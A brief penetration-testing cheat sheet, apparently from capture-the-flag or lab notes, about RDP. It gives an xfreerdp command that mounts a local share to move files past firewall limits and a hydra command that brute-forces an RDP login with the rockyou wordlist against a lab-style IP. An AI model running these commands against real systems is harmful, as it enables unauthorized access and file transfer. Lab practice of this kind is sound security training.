Connection and with mounting share: (Can sometimes get around with firewall restrictions with regard to file transfer)
```xfreerdp3 /v:$target /u:dog /p:dog /cert:ignore +clipboard /dynamic-resolution /drive:.,share```

Bruteforce with hydra:
```hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 rdp -V -e nsr -f -t 50 -K```